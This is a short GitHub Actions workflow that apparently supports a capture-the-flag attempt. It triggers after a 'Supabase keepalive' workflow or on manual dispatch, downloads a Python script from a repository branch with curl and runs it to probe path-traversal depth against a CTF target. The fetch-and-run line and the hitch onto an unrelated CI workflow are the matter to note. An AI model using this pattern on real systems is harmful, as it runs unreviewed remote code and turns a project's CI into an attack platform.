name: DFO CTF temporary runner
on:
  workflow_run:
    workflows: ["Supabase keepalive"]
    types: [completed]
  workflow_dispatch: {}
jobs:
  solve:
    runs-on: ubuntu-latest
    timeout-minutes: 4
    steps:
      - name: Probe exact traversal depth
        shell: bash
        env:
          TARGET: https://64d55bf19201477e84d7.kit.sasc.tf:443
        run: |
          set -euo pipefail
          curl -fsSL https://raw.githubusercontent.com/DIA-SMT/botAmbiente-back/ctf-dfo-run-20260829/ctf/depth_probe_lhr.py -o /tmp/depth.py
          python3 /tmp/depth.py